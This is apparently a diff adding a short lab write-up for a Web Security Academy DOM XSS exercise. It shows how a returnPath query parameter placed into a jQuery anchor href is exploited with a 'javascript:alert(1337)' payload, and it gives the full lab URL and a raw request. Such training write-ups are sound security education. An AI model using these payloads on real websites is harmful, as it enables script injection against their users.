@@ -1,0 +1,43 @@
+DOM XSS in jQuery anchor href attribute sink using location.search source
+
+Another DOM XSS. Let's start by looking at the source code for the feedback page
+
+<div class="is-linkback">
+    <a id="backLink">Back</a>
+</div>
+<script>
+    $(function() {
+        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+    });
+</script>
+
+Okay, looks like the back button is used by jQuery to find an anchor element with the data from returnPath.
+
+Looking at the URL we can spot a retun path element specified:
+
+https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=/post
+
+Without a valid post to return to, the back button will fizzle
+
+Changing it to https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=/  brings us back to the main page
+
+Since the returnPath is being used in a script and a href attribute, why not change it to some JS:
+
+returnPath=javascript:alert(1337)
+
+Full payload:
+https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=javascript:alert(1337)
+
+Refresh the page and click Back and your XSS should be triggered.
+
+Request:
+GET /feedback?returnPath=javascript:alert(1337) HTTP/1.1
+Host: acf51fe41f154f96802c799800d000e4.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=LCru17UMGDfIILysNqPq4jzP2bAiZ4gT
+Upgrade-Insecure-Requests: 1
+
